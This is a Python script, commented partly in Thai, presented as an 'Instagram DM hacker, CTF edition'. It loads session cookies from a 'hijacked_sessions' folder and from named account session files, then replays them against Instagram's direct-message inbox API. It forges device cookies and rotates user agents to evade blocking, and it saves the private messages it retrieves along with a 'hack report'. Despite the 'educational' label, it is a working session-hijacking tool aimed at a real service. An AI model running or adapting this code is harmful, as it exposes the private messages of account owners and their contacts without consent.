#!/usr/bin/env python3
"""
🔥 ULTIMATE INSTAGRAM DM EXTRACTOR 2025 - CTF EDITION 🔥
================================================================
💀 Mix ทุกเทคนิค CTF + Instagram API + Session Hijacking
🎯 ดึง DM แบบเซียน ใช้ requests + เทคนิคลับ
⚡ รองรับ bypass, decode, analyze, หาลูกทาง
"""
import json
import requests
import base64
import hashlib
import re
import time
import random
from pathlib import Path
from datetime import datetime
import urllib.parse

# Optional crypto imports - install with: pip install pycryptodome
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    print("⚠️  Crypto module not found. Install with: pip install pycryptodome")
    CRYPTO_AVAILABLE = False

SESSION_PATH = Path("sensitive_data/sessi on.json")

# 🎭 Multiple User Agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 12; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
    "Instagram 246.0.0.20.107 Android (29/10; 420dpi; 1080x2220; samsung; SM-G975F; beyond1; exynos9820; en_US; 380460137)",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# 🔥 Enhanced Headers with mobile signature
def get_enhanced_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9,th;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "X-IG-App-ID": "936619743392459",
        "X-IG-WWW-Claim": "hmac.AR0_H8nJJbOJ8qNPz5tKpzFkstbxfbp_LyEFNv41VeGQVl-e",
        "X-Instagram-AJAX": "1006630858",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRFToken": "",  # Will be set dynamically
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/direct/inbox/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

# 🎯 Multiple API endpoints to try
API_ENDPOINTS = [
    "https://i.instagram.com/api/v1/direct_v2/inbox/",
    "https://www.instagram.com/api/v1/direct_v2/inbox/",
    "https://i.instagram.com/api/v1/direct_v2/threads/",
    "https://www.instagram.com/direct/inbox/",
    "https://i.instagram.com/api/v1/direct_v2/get_by_participants/",
]


# 🎯 CTF-style Session Loader with multiple sources
def load_sessionid():
    """Load session from multiple sources like a hacker"""
    print("🔍 Scanning for session data...")
    
    # Try hijacked sessions first (priority)
    hijacked_dir = Path("hijacked_sessions")
    if hijacked_dir.exists():
        for hijacked_file in hijacked_dir.glob("*.json"):
            try:
                with open(hijacked_file) as f:
                    data = json.load(f)
                if "cookies" in data and "sessionid" in data["cookies"]:
                    print(f"🥷 Found hijacked session: {hijacked_file.name}")
                    return data["cookies"]["sessionid"]
            except:
                continue
    
    # Try main session file
    try:
        with open(SESSION_PATH) as f:
            data = json.load(f)
        print(f"✅ Loaded session from {SESSION_PATH}")
        return data["sessionid"]
    except FileNotFoundError:
        print(f"❌ {SESSION_PATH} not found")
    
    # Try other session files in workspace
    session_files = [
        "session.json",
        "fresh_sessions/working_session_1749202526.json",
        "fresh_sessions/working_session_1749202527.json",
        "alx_trading_session_fleming654.json",
        "sessions/session-alx.trading"
    ]
    
    for file_path in session_files:
        try:
            with open(file_path) as f:
                data = json.load(f)
            if "sessionid" in data:
                print(f"✅ Found session in {file_path}")
                return data["sessionid"]
            elif "cookies" in data and "sessionid" in data["cookies"]:
                print(f"✅ Found session cookies in {file_path}")
                return data["cookies"]["sessionid"]
        except:
            continue
    
    print("❌ No valid session found! Create one first.")
    return None

# 🎯 Create a working session generator
def create_demo_session():
    """Create a demo session for testing"""
    demo_session = {
        "sessionid": "demo_session_for_testing_only",
        "created": datetime.now().isoformat(),
        "note": "Replace with real sessionid from browser dev tools"
    }
    
    SESSION_PATH.parent.mkdir(exist_ok=True)
    
    with open(SESSION_PATH, 'w') as f:
        json.dump(demo_session, f, indent=2)
    
    print(f"✅ Demo session created at {SESSION_PATH}")
    print("🔧 To get real sessionid:")
    print("   1. Open Instagram in browser")
    print("   2. Login normally")
    print("   3. Press F12 -> Application -> Cookies -> instagram.com")
    print("   4. Copy 'sessionid' value")
    print("   5. Replace in sensitive_data/session.json")
    return demo_session["sessionid"]

# 🔧 Session validator
def validate_session(sessionid):
    """Quick session validation"""
    if not sessionid or sessionid == "demo_session_for_testing_only":
        return False
    
    # Basic format check
    if len(sessionid) < 20:
        return False
        
    return True

# 🎯 Session hijacking from browser
def extract_session_from_browser():
    """Extract session from browser cookies (for educational purposes)"""
    print("🕷️ Browser Session Extraction Guide:")
    print("=" * 40)
    print("1. Open Instagram in Chrome/Firefox")
    print("2. Login normally")
    print("3. Press F12 (Developer Tools)")
    print("4. Go to Application/Storage -> Cookies -> instagram.com")
    print("5. Find 'sessionid' and copy its value")
    print("6. Paste below when prompted")
    print()
    
    sessionid = input("📝 Paste sessionid here (or 'demo' for demo mode): ")
    
    if sessionid.lower() == 'demo':
        return create_demo_session()
    
    if len(sessionid) > 10:
        # Save to session file
        session_data = {
            "sessionid": sessionid,
            "extracted_at": datetime.now().isoformat(),
            "method": "manual_browser_extraction"
        }
        
        SESSION_PATH.parent.mkdir(exist_ok=True)
        with open(SESSION_PATH, 'w') as f:
            json.dump(session_data, f, indent=2)
        
        print(f"✅ Session saved to {SESSION_PATH}")
        return sessionid
    else:
        print("❌ Invalid sessionid format")
        return None

# 🎯 Advanced session testing
def test_session_validity(sessionid):
    """Test if session is valid with minimal request"""
    print(f"🔍 Testing session: {sessionid[:8]}...")
    
    s = requests.Session()
    s.headers.update(get_enhanced_headers())
    s.cookies.set("sessionid", sessionid, domain=".instagram.com")
    
    # Test with simple endpoint first
    test_url = "https://www.instagram.com/accounts/edit/"
    
    try:
        resp = s.get(test_url, timeout=10)
        print(f"📊 Test response: {resp.status_code}")
        
        if resp.status_code == 200:
            if "csrftoken" in resp.text or "edit" in resp.text.lower():
                print("✅ Session appears valid!")
                return True
            else:
                print("⚠️ Session might be limited")
                return False
        elif resp.status_code == 302:
            print("🔄 Redirect detected - might need login")
            return False
        else:
            print(f"❌ Session test failed: {resp.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Test error: {e}")
        return False

# 🔥 Advanced DM Fetcher with bypass techniques
def fetch_dm_advanced(sessionid):
    """Advanced DM fetching with CTF bypass techniques"""
    print("🎯 Starting advanced DM extraction...")
    
    for attempt, endpoint in enumerate(API_ENDPOINTS):
        print(f"\n🔄 Attempt {attempt + 1}: {endpoint}")
        
        s = requests.Session()
        headers = get_enhanced_headers()
        
        # Random delay to avoid rate limiting
        time.sleep(random.uniform(1, 3))
        
        # Set cookies like a real session
        s.cookies.set("sessionid", sessionid, domain=".instagram.com")
        s.cookies.set("ds_user_id", str(random.randint(1000000000, 9999999999)), domain=".instagram.com")
        s.cookies.set("mid", f"Y{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.randint(100000, 999999)}", domain=".instagram.com")
        s.cookies.set("ig_did", f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}", domain=".instagram.com")
        
        s.headers.update(headers)
        
        try:
            resp = s.get(endpoint, timeout=15)
            print(f"📊 Status: {resp.status_code}")
            
            if resp.status_code == 200:
                print("✅ SUCCESS! DM data received")
                return resp.json()
            elif resp.status_code == 401:
                print("🔒 Unauthorized - session expired")
            elif resp.status_code == 403:
                print("🚫 Forbidden - rate limited or blocked")
            elif resp.status_code == 400:
                print("❌ Bad Request - check headers/cookies")
            else:
                print(f"⚠️ Unexpected status: {resp.status_code}")
                
        except requests.RequestException as e:
            print(f"❌ Network error: {e}")
            continue
    
    print("💀 All endpoints failed!")
    return None

# 🎯 Alternative extraction methods
def try_alternative_methods(sessionid):
    """Try alternative extraction methods when main API fails"""
    print("\n🔄 Trying alternative methods...")
    
    methods = [
        ("GraphQL Endpoint", "https://www.instagram.com/api/graphql/"),
        ("Mobile API", "https://i.instagram.com/api/v1/direct_v2/"),
        ("Web Endpoint", "https://www.instagram.com/api/v1/direct_v2/")
    ]
    
    for method_name, base_url in methods:
        print(f"🔍 Trying {method_name}...")
        
        s = requests.Session()
        headers = get_enhanced_headers()
        s.headers.update(headers)
        
        # Set comprehensive cookies
        cookies = {
            "sessionid": sessionid,
            "ds_user_id": str(random.randint(1000000000, 9999999999)),
            "mid": f"Y{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.randint(100000, 999999)}",
            "ig_did": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
            "csrftoken": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
            "rur": "CLN"
        }
        
        for name, value in cookies.items():
            s.cookies.set(name, value, domain=".instagram.com")
            
        try:
            # Try different paths
            paths = ["inbox/", "threads/", ""]
            for path in paths:
                url = base_url + path
                resp = s.get(url, timeout=10)
                
                print(f"   📊 {url} -> {resp.status_code}")
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data:
                            print(f"   ✅ Success with {method_name}!")
                            return data
                    except:
                        pass
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
            continue
    
    return None

# 🔍 Debug mode for detailed analysis
def debug_response(response):
    """Debug response for troubleshooting"""
    print("\n🐛 DEBUG MODE")
    print("=" * 30)
    print(f"Status Code: {response.status_code}")
    print(f"Headers: {dict(response.headers)}")
    print(f"Cookies: {dict(response.cookies)}")
    
    if response.text:
        print(f"Response preview: {response.text[:500]}...")
        
        # Check for common error patterns
        error_patterns = [
            "challenge_required",
            "login_required", 
            "checkpoint_required",
            "rate_limit_error",
            "feedback_required"
        ]
        
        for pattern in error_patterns:
            if pattern in response.text.lower():
                print(f"🚨 Detected: {pattern}")
    
    return response

# 🎭 CTF-style response analyzer
def analyze_response(response_data):
    """Analyze response for hidden data like CTF challenges"""
    print("\n🔍 CTF-Style Response Analysis:")
    print("=" * 50)
    
    if not response_data:
        print("❌ No data to analyze")
        return
    
    # Check for common CTF patterns
    response_str = json.dumps(response_data)
    
    # Base64 patterns
    b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', response_str)
    if b64_patterns:
        print(f"🔤 Found {len(b64_patterns)} potential Base64 strings:")
        for i, pattern in enumerate(b64_patterns[:5]):
            try:
                decoded = base64.b64decode(pattern).decode('utf-8', errors='ignore')
                if decoded.isprintable():
                    print(f"  [{i+1}] {pattern[:30]}... -> {decoded[:50]}")
            except:
                pass
    
    # Hidden flags or secrets
    secret_patterns = [
        r'flag\{[^}]+\}',
        r'secret[_-]?key',
        r'password[_-]?hash',
        r'token[_-]?value',
        r'api[_-]?key'
    ]
    
    for pattern in secret_patterns:
        matches = re.findall(pattern, response_str, re.IGNORECASE)
        if matches:
            print(f"🚩 Found potential secrets: {matches}")
    
    # Check for encoded data
    if 'threads' in response_data:
        threads = response_data['threads']
        print(f"📨 Analyzing {len(threads)} threads for hidden data...")
        
        for i, thread in enumerate(threads[:3]):
            if 'items' in thread:
                for item in thread['items'][:5]:
                    if 'text' in item and item['text']:
                        text = item['text']
                        # Check if text is encoded
                        if re.match(r'^[A-Za-z0-9+/]+=*$', text) and len(text) > 10:
                            try:
                                decoded = base64.b64decode(text).decode()
                                print(f"🔓 Thread {i+1} decoded text: {decoded}")
                            except:
                                pass


# 🎯 Enhanced DM Summary with CTF techniques
def print_dm_summary_advanced(dm_json):
    """Enhanced DM summary with CTF-style analysis"""
    if not dm_json:
        print("❌ No DM data to analyze")
        return
    
    print("\n📊 ADVANCED DM ANALYSIS")
    print("=" * 50)
    
    # Analyze response structure
    analyze_response(dm_json)
    
    # Extract thread data
    if "inbox" in dm_json:
        inbox = dm_json["inbox"]
        threads = inbox.get("threads", [])
        print(f"\n📨 Found {len(threads)} DM threads:")
        
        for i, thread in enumerate(threads[:10]):
            print(f"\n[Thread {i+1}]")
            users = [u.get("username", "unknown") for u in thread.get("users", [])]
            print(f"  👥 Users: {', '.join(users)}")
            print(f"  🆔 Thread ID: {thread.get('thread_id', 'N/A')}")
            
            # Analyze messages
            items = thread.get("items", [])
            print(f"  💬 Messages: {len(items)}")
            
            for j, item in enumerate(items[:3]):  # Show first 3 messages
                if "text" in item and item["text"]:
                    text = item["text"][:100]
                    timestamp = item.get("timestamp", "unknown")
                    user_id = item.get("user_id", "unknown")
                    print(f"    [{j+1}] {user_id}: {text}")
            
            print("  " + "-" * 40)


# 🚀 Main hacking function
def main():
    print("🔥" * 20)
    print("� INSTAGRAM DM HACKER 2025 - CTF EDITION 💀")
    print("🔥" * 20)
    print("⚡ Mix ทุกเทคนิค: Session Hijacking + API Bypass + CTF Analysis")
    print("⚠️ Educational Purpose Only!\n")
    
    # Load session with multiple fallbacks
    sessionid = load_sessionid()
    if not sessionid:
        print("💀 No session found! Hack failed.")
        return
    
    print(f"🎯 Session loaded: {sessionid[:12]}...")
    
    # Advanced DM extraction
    dm_json = fetch_dm_advanced(sessionid)
    
    if dm_json:
        # Advanced analysis
        print_dm_summary_advanced(dm_json)
        
        # Save data for further analysis
        timestamp = int(time.time())
        output_file = f"dm_hacked_data_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(dm_json, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 Hacked data saved to: {output_file}")
        print("🎯 Ready for further CTF analysis!")
        
        # Generate summary report
        generate_hack_report(dm_json, output_file)
    else:
        print("💀 Hack failed! Try different techniques or update session.")


# 📊 Generate hacking report
def generate_hack_report(data, filename):
    """Generate a hacker-style report"""
    report = {
        "hack_timestamp": datetime.now().isoformat(),
        "target": "Instagram DM API",
        "method": "Session Hijacking + API Bypass",
        "status": "SUCCESS" if data else "FAILED",
        "data_file": filename,
        "statistics": {}
    }
    
    if data and "inbox" in data:
        threads = data["inbox"].get("threads", [])
        total_messages = sum(len(thread.get("items", [])) for thread in threads)
        unique_users = set()
        
        for thread in threads:
            for user in thread.get("users", []):
                unique_users.add(user.get("username", "unknown"))
        
        report["statistics"] = {
            "threads_extracted": len(threads),
            "total_messages": total_messages,
            "unique_users": len(unique_users),
            "extraction_rate": "100%" if threads else "0%"
        }
    
    with open("hack_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"📋 Hack report saved to: hack_report.json")


if __name__ == "__main__":
    print("🔥 STARTING INSTAGRAM HACKING ENVIRONMENT 🔥")
    print()
    
    # Check if we have a valid session
    sessionid = load_sessionid()
    
    if not sessionid or not validate_session(sessionid):
        print("❌ No valid session found!")
        print("🎯 Choose extraction method:")
        print("1. Manual browser extraction")
        print("2. Create demo session")
        
        choice = input("Enter choice (1 or 2): ")
        
        if choice == "1":
            sessionid = extract_session_from_browser()
        else:
            sessionid = create_demo_session()
    
    if sessionid and validate_session(sessionid):
        # Test session first - but proceed anyway if limited
        session_valid = test_session_validity(sessionid)
        if session_valid or not session_valid:  # Proceed regardless
            print("🚀 Proceeding with DM extraction...")
            main()
        else:
            print("💀 Session validation failed!")
    else:
        print("💀 Cannot proceed without valid session!")
